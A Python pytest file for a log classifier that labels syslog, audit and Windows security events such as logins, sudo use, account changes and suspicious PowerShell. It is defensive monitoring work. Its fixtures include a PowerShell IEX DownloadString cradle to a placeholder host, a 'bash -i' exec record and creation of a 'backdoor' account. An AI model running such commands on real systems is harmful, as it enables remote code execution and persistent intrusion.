"""Įrenginio veiksmų klasifikavimas: tikros journal eilutės, demonstraciniai šablonai, Windows įvykiai."""
from __future__ import annotations

import datetime
import json
import time

import pytest

from app.services.activity import TEXT_LIMIT, classify

T = datetime.datetime(2026, 10, 29, 8, 0, tzinfo=datetime.timezone.utc)
TS = str(int(T.timestamp()) * 10**9)


def syslog(program: str, message: str) -> dict:
    """Įrašas taip, kaip jį grąžina Loki: kolektoriaus syslog-ng šablono eilutė."""
    line = f"2026-10-29T08:00:00+00:00 pc auth.info {program}[42]: {message}"
    return {"timestamp": TS, "line": line, "labels": {"job": "syslog", "host": "pc"}}


def found(entry: dict):
    item = classify(entry)
    return None if item is None else (item.kind, item.user, item.text)


@pytest.mark.parametrize("program, message, expected", [
    ("sshd", "Accepted publickey for deploy from 192.168.1.50 port 51022 ssh2: ED25519 SHA256:abc",
     ("login", "deploy", "SSH login from 192.168.1.50 (publickey)")),
    ("sshd", "Failed password for invalid user admin from 203.0.113.7 port 40000 ssh2",
     ("auth_failed", "admin", "SSH login failed from 203.0.113.7")),
    ("sshd", "Failed password for root from 203.0.113.7 port 40001 ssh2",
     ("auth_failed", "root", "SSH login failed from 203.0.113.7")),
    ("systemd-logind", "New session '1' of user 'oxshan' with class 'user' and type 'tty'.",
     ("login", "oxshan", "Session 1 started")),
    ("systemd-logind", "New session 3 of user alice.",
     ("login", "alice", "Session 3 started")),
    ("sudo", "  oxshan : TTY=pts/0 ; PWD=/home/oxshan ; USER=root ; COMMAND=/usr/bin/pacman -S vscode",
     ("admin", "oxshan", "sudo /usr/bin/pacman -S vscode")),
    ("sudo", "  oxshan : a password is required ; PWD=/home/oxshan/Kursinis ; USER=root ; COMMAND=/usr/bin/true",
     ("auth_failed", "oxshan", "sudo: a password is required")),
    ("sudo", "  bob : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/id",
     ("auth_failed", "bob", "sudo: 3 incorrect password attempts")),
    ("su", "pam_unix(su:session): session opened for user root(uid=0) by oxshan(uid=1000)",
     ("admin", "oxshan", "su to root")),
    ("su", ("pam_unix(su:auth): authentication failure; logname=oxshan uid=1000 euid=0 tty=/dev/pts/1 "
            "ruser=oxshan rhost=  user=root"),
     ("auth_failed", "root", "su: authentication failure")),
    ("useradd", "new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash, from=/dev/pts/0",
     ("account", "backdoor", "User backdoor created")),
    ("groupadd", "new group: name=devs, GID=1002", ("account", "", "Group devs created")),
    ("usermod", "add 'alice' to group 'wheel'", ("account", "alice", "alice added to group wheel")),
    ("userdel", "delete user 'backdoor'", ("account", "backdoor", "User backdoor deleted")),
    ("passwd", "pam_unix(passwd:chauthtok): password changed for alice",
     ("account", "alice", "Password changed for alice")),
    ("kernel", "Linux version 7.3.0-5-cachyos (linux-cachyos@cachyos) (clang version 23.1.3) #1 SMP",
     ("boot", "", "System booted (Linux 7.3.0-5-cachyos)")),
    ("audisp-syslog", 'type=EXECVE msg=audit(1729501400.202:840): argc=3 a0="ls" a1="-la" a2=2F746D7020646972',
     ("command", "", "ls -la /tmp dir")),
], ids=["ssh-ok", "ssh-fail-invalid", "ssh-fail", "logind", "logind-old", "sudo", "sudo-nopass",
        "sudo-wrongpw", "su", "pam-fail", "useradd", "groupadd", "usermod", "userdel", "passwd", "boot", "execve"])
def test_real_syslog_lines(program, message, expected):
    assert found(syslog(program, message)) == expected


@pytest.mark.parametrize("program, message", [
    ("systemd-logind", "New session '2' of user 'oxshan' with class 'manager' and type 'unspecified'."),
    ("sudo", "pam_unix(sudo:session): session opened for user root(uid=0) by oxshan(uid=1000)"),
    ("sudo", ("pam_unix(sudo:auth): authentication failure; logname=oxshan uid=1000 euid=0 tty=/dev/pts/1 "
              "ruser=oxshan rhost=  user=oxshan")),
    ("sshd", ("pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= "
              "rhost=203.0.113.7  user=root")),
    ("sshd", "Invalid user admin from 203.0.113.7 port 40000"),
    ("usermod", "add 'alice' to shadow group 'wheel'"),
    ("CRON", "(root) CMD (/usr/lib/sysstat/sa1 1 1)"),
    ("systemd", "Started Daily apt download activities."),
    ("kursinis-status", '{"v":1,"top":[{"name":"sudo","n":1,"cpu":0.0,"mem_kb":10}]}'),
    ("firewall", "input: in:ether1, proto TCP, 203.0.113.7:40000->192.168.1.1:22, DROP"),
], ids=["logind-manager", "sudo-pam-session", "sudo-pam-fail", "sshd-pam-fail", "ssh-invalid-user",
        "shadow-group", "cron", "systemd", "status-record", "firewall"])
def test_noise_is_not_an_action(program, message):
    assert classify(syslog(program, message)) is None


@pytest.mark.parametrize("program, message, expected", [
    ("loginwindow", "USER_PROCESS: user admin session opened", ("login", "admin", "Session opened")),
    ("Security-Auditing", "An account was successfully logged on (Event 4624) for admin from 192.168.1.60",
     ("login", "admin", "Logon from 192.168.1.60")),
    ("system", "user admin logged in from 192.168.1.50 via webfig",
     ("login", "admin", "Login from 192.168.1.50 via webfig")),
    ("Kernel-General", "The operating system started successfully", ("boot", "", "System started")),
    ("WindowsUpdateClient", "Installation Successful: Update KB5034123",
     ("update", "", "Update installed: Update KB5034123")),
], ids=["mac-login", "win-4624", "router-login", "win-boot", "win-update"])
def test_demo_device_lines(program, message, expected):
    assert found(syslog(program, message)) == expected


def test_raw_audit_line_without_syslog_prefix():
    entry = {"timestamp": TS, "line": 'type=EXECVE msg=audit(1:3): argc=2 a0="bash" a1="-i"',
             "labels": {"job": "linux_endpoint", "host": "lab"}}
    assert found(entry) == ("command", "", "bash -i")


def test_text_is_capped_and_time_is_iso():
    item = classify(syslog("sudo", "  bob : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/echo " + "x" * 500))
    assert item is not None and len(item.text) == TEXT_LIMIT and item.text.endswith("…")
    assert item.time == T.isoformat()


def test_entry_without_valid_timestamp_is_skipped():
    assert classify({**syslog("kernel", "Linux version 7.3.0 (x)"), "timestamp": "?"}) is None


def test_hostile_lines_classify_fast():
    """Syslog'ą gali siųsti bet kas: piktybinės eilutės negali ilgam užimti serverio (regex backtracking)."""
    hostile = [
        syslog("sudo", "  u : " + " " * 1900 + "authentication failure"),
        syslog("sudo", "  u : " + " " * 8000 + "authentication failure"),
        syslog("audit", "type=EXECVE " * 170),
        syslog("su", "authentication failure; " * 80),
    ]
    started = time.perf_counter()
    for _ in range(250):
        for entry in hostile:
            assert classify(entry) is None
    assert time.perf_counter() - started < 1.0


def test_deeply_nested_windows_json_is_skipped():
    assert classify({"timestamp": TS, "line": "[" * 20000 + "]" * 20000, "labels": {"job": "windows"}}) is None


def test_control_and_bidi_characters_are_removed():
    item = classify(syslog("sudo", "  bob : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/echo a\u202eb\x07c"))
    assert item is not None and item.text == "sudo /bin/echo a b c"


def win(event_id: int, data: dict, channel: str = "Security", **extra) -> dict:
    """Alloy windowsevent JSON eilutė (kaip anomaly-detector tests/fixtures/windows)."""
    event_data = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    obj = {"source": "Microsoft-Windows-Security-Auditing", "channel": channel, "computer": "WIN11-LAB",
           "event_id": event_id, "levelText": "Information", "event_data": event_data, **extra}
    return {"timestamp": TS, "line": json.dumps(obj), "labels": {"job": "windows", "host": "WIN11-LAB"}}


@pytest.mark.parametrize("entry, expected", [
    (win(4624, {"TargetUserName": "jdoe", "LogonType": "2", "IpAddress": "-"}),
     ("login", "jdoe", "Logon (interactive)")),
    (win(4624, {"TargetUserName": "jdoe", "LogonType": "10", "IpAddress": "10.0.0.5"}),
     ("login", "jdoe", "Logon (remote) from 10.0.0.5")),
    (win(4625, {"TargetUserName": "administrator", "LogonType": "3", "IpAddress": "203.0.113.7"}),
     ("auth_failed", "administrator", "Logon failed from 203.0.113.7")),
    (win(4720, {"TargetUserName": "backdoor", "SubjectUserName": "admin"}),
     ("account", "backdoor", "User backdoor created by admin")),
    (win(4726, {"TargetUserName": "backdoor", "SubjectUserName": "admin"}),
     ("account", "backdoor", "User backdoor deleted by admin")),
    (win(4732, {"MemberName": "-", "MemberSid": "S-1-5-21-1-2-3-1001", "TargetUserName": "Administrators"}),
     ("account", "S-1-5-21-1-2-3-1001", "S-1-5-21-1-2-3-1001 added to group Administrators")),
    (win(4740, {"TargetUserName": "jdoe"}), ("account", "jdoe", "Account jdoe locked out")),
    (win(1102, {}, user_data="<LogFileCleared><SubjectUserName>admin</SubjectUserName></LogFileCleared>"),
     ("log_cleared", "admin", "Security log cleared")),
    (win(4104, {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x')"},
         channel="Microsoft-Windows-PowerShell/Operational", levelText="Warning"),
     ("script", "", "Suspicious PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://x')")),
    (win(1, {"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /all", "User": "LAB\\jdoe"},
         channel="Microsoft-Windows-Sysmon/Operational"),
     ("command", "LAB\\jdoe", "whoami.exe: whoami /all")),
], ids=["4624-interactive", "4624-remote", "4625", "4720", "4726", "4732", "4740", "1102", "4104-warning", "sysmon-1"])
def test_windows_events(entry, expected):
    assert found(entry) == expected


@pytest.mark.parametrize("entry", [
    win(4624, {"TargetUserName": "SYSTEM", "LogonType": "5"}),
    win(4624, {"TargetUserName": "jdoe", "LogonType": "3"}),
    win(4104, {"ScriptBlockText": "Get-Date"}, channel="Microsoft-Windows-PowerShell/Operational"),
    win(1, {"Image": "x.exe"}, channel="Security"),
    win(3, {"Image": "x.exe"}, channel="Microsoft-Windows-Sysmon/Operational"),
    {"timestamp": TS, "line": "not json", "labels": {"job": "windows"}},
], ids=["4624-service", "4624-network", "4104-verbose", "eid1-not-sysmon", "sysmon-3", "bad-json"])
def test_windows_noise(entry):
    assert classify(entry) is None
